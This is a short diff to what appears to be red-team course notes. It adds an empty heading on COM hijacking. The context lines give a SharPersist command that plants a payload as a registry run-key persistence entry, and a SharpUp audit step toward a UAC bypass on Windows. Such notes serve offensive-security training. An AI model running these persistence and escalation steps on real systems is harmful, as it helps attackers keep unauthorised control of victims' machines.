@@ -121,6 +121,9 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 2. Place this **artifactx64.exe** in that **C:\tools\malPayloads\artifactx64.exe** in Windows 10 OS. 
 3. `execute-assembly SharPersist.exe -t reg -c "C:\tools\malPayloads\artifactx64.exe" -a "/q /n" -k "hkcurun" -v "someNameYouWant" -m add`
 
+### Persistence for MS Windows via SharPersist - COM Hijacking DLL
+
+
 ### Windows Privilege Escalation - UAC Bypass
 1. First run the SharpUp.exe via command `execute-assembly /opt/CRTO/SharpUp.exe audit`
 2. If you see some error like **In medium integrity but user is a local administrator - UAC can be bypassed.** Then this attack **may** be successful. 
